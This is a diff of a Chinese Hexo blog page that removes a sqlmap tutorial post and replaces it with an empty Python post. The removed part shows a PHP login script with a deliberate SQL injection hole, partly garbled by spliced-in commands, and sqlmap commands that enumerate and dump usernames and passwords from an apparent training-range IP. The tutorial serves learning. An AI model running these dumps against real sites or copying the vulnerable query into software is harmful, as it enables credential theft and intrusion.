@@ -4,12 +4,8 @@
 
 <head><meta name="generator" content="Hexo 3.8.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="sqlmap的使用教程, python,java,javaweb,html,css,php">
-    <meta name="description" content="最近在学习一些工具的使用，接下来会每一天都更新博客，记录自己的日常收获。
-
-  &amp;lt;?php
-    //连接数据库，主机，用户名，密码，数据库
-                    $con=mysqli_connect(&#34;loca">
+    <meta name="keywords" content="python学习, python,java,javaweb,html,css,php">
+    <meta name="description" content="python学习 | Summer&#39;s Blog">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -17,7 +13,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>sqlmap的使用教程 | Summer&#39;s Blog</title>
+    <title>python学习 | Summer&#39;s Blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -263,13 +259,13 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/23.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/22.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        sqlmap的使用教程
+                        python学习
                     </div>
                 </div>
             </div>
@@ -380,8 +376,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/工具/" target="_blank">
-                                <span class="chip bg-color">工具</span>
+                            <a href="/tags/python/" target="_blank">
+                                <span class="chip bg-color">python</span>
                             </a>
                         
                     </div>
@@ -392,8 +388,8 @@
                     <div class="post-cate">
                         <i class="fa fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/sqlmap/" class="post-category" target="_blank">
-                                sqlmap
+                            <a href="/categories/python学习/" class="post-category" target="_blank">
+                                python学习
                             </a>
                         
                     </div>
@@ -404,21 +400,21 @@
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2019-09-14
+                    2019-09-17
                 </div>
 
                 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        762
+                        0
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        3 分
+                        1 分
                     </div>
                     
                 
@@ -434,89 +430,7 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>最近在学习一些工具的使用，接下来会每一天都更新博客，记录自己的日常收获。</p>
-<a id="more"></a>
-<pre class=" language-php"><code class="language-php">  <span class="token delimiter">&lt;?php</span>
-    <span class="token comment" spellcheck="true">//连接数据库，主机，用户名，密码，数据库</span>
-                    <span class="token variable">$con</span><span class="token operator">=</span><span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token string">"localhost"</span><span class="token punctuation">,</span><span class="token string">"root"</span><span class="token punctuation">,</span><span class="token string">"root"</span><span class="token punctuation">,</span><span class="token string">"xss"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$con</span><span class="token punctuation">)</span>
-    <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//连接失败会输出error+错误代码</span>
-        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"error:"</span><span class="token punctuation">.</span><span class="token function">mysqli_connect_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">}</span>
-        <span class="token comment" spellcheck="true">//把用户在index.html输入的账号和密码保存在$user和$pass两个变量中</span>
-    <span class="token variable">$user</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-    <span class="token variable">$pass</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-        <span class="token comment" spellcheck="true">//数据库查询语句，就是这样的查询方式存在着致命的SQL注入</span>
-        <span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"select * from admin where user='$user' and password='$pass'"</span><span class="token punctuation">;</span>
-    <span class="token comment" spellcheck="true">//echo $sql;</span>
-        <span class="token comment" spellcheck="true">//查询结果保存在$res对象中</span>
-        <span class="token variable">$res</span><span class="token operator">=</span><span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token comment" spellcheck="true">//var_dump($res);</span>
-        <span class="token comment" spellcheck="true">//把$res转换成索引数组以便输出到页面</span>
-        <span class="token variable">$row</span><span class="token operator">=</span><span class="token function">mysqli_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">,</span><span class="token constant">MYSQLI_NUM</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token comment" spellcheck="true">//var_dump($row);</span>
-        <span class="token comment" spellcheck="true">//如果数组不为空就遍历数组到页面</span>
-        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_null</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-    <span class="token punctuation">{</span>
-        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>
-        <span class="token punctuation">{</span>  
-                    <span class="token keyword">echo</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">;</span>python sqlmap <span class="token operator">-</span>u http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//219.153.49.228:46683/new_list.php?id=1 -D mozhe_Discuz_StormGroup -T StormGroup_member -C id,name,password --dump</span>
-                    <span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>
-        <span class="token punctuation">}</span>
-    <span class="token punctuation">}</span>
-    <span class="token keyword">else</span>
-    <span class="token punctuation">{</span>
-        <span class="token keyword">echo</span> <span class="token string">"登录失败！"</span><span class="token punctuation">;</span>
-    <span class="token punctuation">}</span> 
-<span class="token delimiter">?></span>python sqlmap <span class="token operator">-</span>u http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//219.153.49.228:46683/new_list.php?id=1 -D mozhe_Discuz_StormGroup -T StormGroup_member -C id,name,password --dumppython sqlmap -u http://219.153.49.228:46683/new_list.php?id=1 -D mozhe_Discuz_StormGroup -T StormGroup_member -C id,name,password --dumppython sqlmap -u http://219.153.49.228:46683/new_list.php?id=1 -D mozhe_Discuz_StormGroup -T StormGroup_member -C id,name,password --dump</span>
-</code></pre>
-<h2 id="sqlmap使用方式："><a href="#sqlmap使用方式：" class="headerlink" title="sqlmap使用方式："></a><strong>sqlmap使用方式：</strong></h2><pre class=" language-sql"><code class="language-sql">Python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u <span class="token string">"目标url"</span> 其他参数
-Python sqlmap<span class="token punctuation">.</span>py <span class="token comment" spellcheck="true">--url="目标url" 其他参数</span>
-Python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u test<span class="token punctuation">.</span>txt 其他参数
-</code></pre>
-<p>目标站点：<a href="http://219.153.49.228:46683/new_list.php?id=1" target="_blank" rel="noopener">http://219.153.49.228:46683/new_list.php?id=1</a></p>
-<h3 id="检查注入点："><a href="#检查注入点：" class="headerlink" title="检查注入点："></a><strong>检查注入点：</strong></h3><pre class=" language-sql"><code class="language-sql">Python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u http:<span class="token comment" spellcheck="true">//219.153.49.228:46683/new_list.php?id=1</span>
-<span class="token comment" spellcheck="true">--也可以先进行手工注入，判断出注入点</span>
-</code></pre>
-<h3 id="爆出所有数据库信息："><a href="#爆出所有数据库信息：" class="headerlink" title="爆出所有数据库信息："></a><strong>爆出所有数据库信息：</strong></h3><pre class=" language-sql"><code class="language-sql">Python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u http:<span class="token comment" spellcheck="true">//219.153.49.228:46683/new_list.php?id=1 --dbs</span>
-</code></pre>
-<h3 id="爆当前数据库信息："><a href="#爆当前数据库信息：" class="headerlink" title="爆当前数据库信息："></a><strong>爆当前数据库信息：</strong></h3><pre class=" language-sql"><code class="language-sql">Python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u http:<span class="token comment" spellcheck="true">//219.153.49.228:46683/new_list.php?id=1 --current-db</span>
-</code></pre>
-<h3 id="指定库名列出所有表："><a href="#指定库名列出所有表：" class="headerlink" title="指定库名列出所有表："></a><strong>指定库名列出所有表：</strong></h3><pre class=" language-sql"><code class="language-sql">Python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u http:<span class="token comment" spellcheck="true">//219.153.49.228:46683/new_list.php?id=1 -D 库名 --tables</span>
-</code></pre>
-<h3 id="指定库名表名列出所有字段："><a href="#指定库名表名列出所有字段：" class="headerlink" title="指定库名表名列出所有字段："></a><strong>指定库名表名列出所有字段：</strong></h3><pre class=" language-sql"><code class="language-sql">Python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u http:<span class="token comment" spellcheck="true">//219.153.49.228:46683/new_list.php?id=1 -D 库名 -T 表名 --columns</span>
-</code></pre>
-<h3 id="指定库名表名dump出指定字段："><a href="#指定库名表名dump出指定字段：" class="headerlink" title="指定库名表名dump出指定字段："></a><strong>指定库名表名dump出指定字段：</strong></h3><pre class=" language-sql"><code class="language-sql">Python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u http:<span class="token comment" spellcheck="true">//219.153.49.228:46683/new_list.php?id=1 -D 库名 -T 表名 -C id,name,password --dump</span>
-</code></pre>
-<h3 id="实操："><a href="#实操：" class="headerlink" title="实操："></a>实操：</h3><p><strong>目标url:</strong> <a href="http://219.153.49.228:46683/new_list.php?id=1" target="_blank" rel="noopener"> http://219.153.49.228:46683/new_list.php?id=1</a></p>
-<p><strong>判断注入点：</strong></p>
-<p>经过手工注入发现 and 1=1 和 and 1=2 返回的页面不同，那么我就知道了在id 这里存在了注入点。也可以在sqlmap中判断是否是可以注入的。</p>
-<pre class=" language-sql"><code class="language-sql">python sqlmap <span class="token operator">-</span>u http:<span class="token comment" spellcheck="true">//219.153.49.228:46683/new_list.php?id=1</span>
-</code></pre>
-<p><img src="/2019/09/14/sqlmap的使用教程/1.png" alt></p>
-<p><img src="/2019/09/14/sqlmap的使用教程/2.png" alt></p>
-<p><strong>爆出所有数据库信息：</strong></p>
-<pre class=" language-sql"><code class="language-sql">python sqlmap <span class="token operator">-</span>u http:<span class="token comment" spellcheck="true">//219.153.49.228:46683/new_list.php?id=1 --dbs</span>
-</code></pre>
-<p><img src="/2019/09/14/sqlmap的使用教程/3.png" alt></p>
-<p><strong>爆当前数据库信息：</strong></p>
-<pre class=" language-sql"><code class="language-sql">python sqlmap <span class="token operator">-</span>u http:<span class="token comment" spellcheck="true">//219.153.49.228:46683/new_list.php?id=1 --current-db</span>
-</code></pre>
-<p><img src="/2019/09/14/sqlmap的使用教程/4.png" alt></p>
-<p><strong>指定库名列出所有表：</strong></p>
-<pre class=" language-sql"><code class="language-sql">python sqlmap <span class="token operator">-</span>u http:<span class="token comment" spellcheck="true">//219.153.49.228:46683/new_list.php?id=1 -D mozhe_Discuz_StormGroup --tables</span>
-</code></pre>
-<p><img src="/2019/09/14/sqlmap的使用教程/5.png" alt></p>
-<p><strong>指定库名表名列出所有字段：</strong></p>
-<pre class=" language-sql"><code class="language-sql">python sqlmap <span class="token operator">-</span>u http:<span class="token comment" spellcheck="true">//219.153.49.228:46683/new_list.php?id=1 -D mozhe_Discuz_StormGroup -T StormGroup_member --columns</span>
-</code></pre>
-<p><img src="/2019/09/14/sqlmap的使用教程/6.png" alt></p>
-<p><strong>指定库名表名dump出指定字段：</strong></p>
-<pre class=" language-sql"><code class="language-sql">python sqlmap <span class="token operator">-</span>u http:<span class="token comment" spellcheck="true">//219.153.49.228:46683/new_list.php?id=1 -D mozhe_Discuz_StormGroup -T StormGroup_member -C id,name,password --dump</span>
-</code></pre>
-<p><img src="/2019/09/14/sqlmap的使用教程/7.png" alt></p>
-<p>日后更新！！</p>
-
+                
             </div>
             <hr>
 
@@ -671,9 +585,9 @@ Python sqlmap<span class="token punctuation">.</span>py <span class="token opera
             </div>
             <br>
             <span xmlns:dct="http://purl.org/dc/terms/" href="http://purl.org/dc/dcmitype/Text" property="dct:title" rel="dct:type">
-                    《sqlmap的使用教程》
+                    《python学习》
                 </span> 由
-            <a xmlns:cc="http://creativecommons.org/ns#" href="/2019/09/14/sqlmap的使用教程/" property="cc:attributionName" rel="cc:attributionURL">
+            <a xmlns:cc="http://creativecommons.org/ns#" href="/2019/09/17/python学习/" property="cc:attributionName" rel="cc:attributionURL">
                 Aru's
             </a> 采用
             <a rel="license" href="https://creativecommons.org/licenses/by/4.0/deed.zh">
@@ -714,7 +628,58 @@ Python sqlmap<span class="token punctuation">.</span>py <span class="token opera
         
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="fa fa-dot-circle-o"></i>&nbsp;本篇
+            </div>
+            <div class="card">
+                <a href="/2019/09/17/python学习/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="python学习">
+                        
+                        <span class="card-title">python学习</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-09-17
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/python学习/" class="post-category" target="_blank">
+                                    python学习
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/python/" target="_blank">
+                        <span class="chip bg-color">python</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fa fa-chevron-right"></i>
+            </div>
             <div class="card">
                 <a href="/2019/09/15/Struts2框架学习/">
                     <div class="card-image">
@@ -732,9 +697,9 @@ Python sqlmap<span class="token punctuation">.</span>py <span class="token opera
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2019-09-15
-                        </span>
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-09-15
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
@@ -752,59 +717,6 @@ Python sqlmap<span class="token punctuation">.</span>py <span class="token opera
                     
                     <a href="/tags/javaweb框架/" target="_blank">
                         <span class="chip bg-color">javaweb框架</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fa fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2019/06/05/判断是否为整形注入/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/5.jpg" class="responsive-img" alt="判断是否为整形注入">
-                        
-                        <span class="card-title">判断是否为整形注入</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            为了记录自己，以后避免遗忘！
-总结sql的注入过程中，如何判断整形注入？sqli-labs的Less-2就是一个典型的整形注入，
-
-1，输入单引号，页面报错
-http://127.0.0.1/sqli-labs/Less-2/?id=1&#
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-06-05
-                            </span>
-                        <span class="publish-author">
-                            
-                            <i class="fa fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/web/" class="post-category" target="_blank">
-                                    web
-                                </a>
-                            
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/sql注入/" target="_blank">
-                        <span class="chip bg-color">sql注入</span>
                     </a>
                     
                 </div>
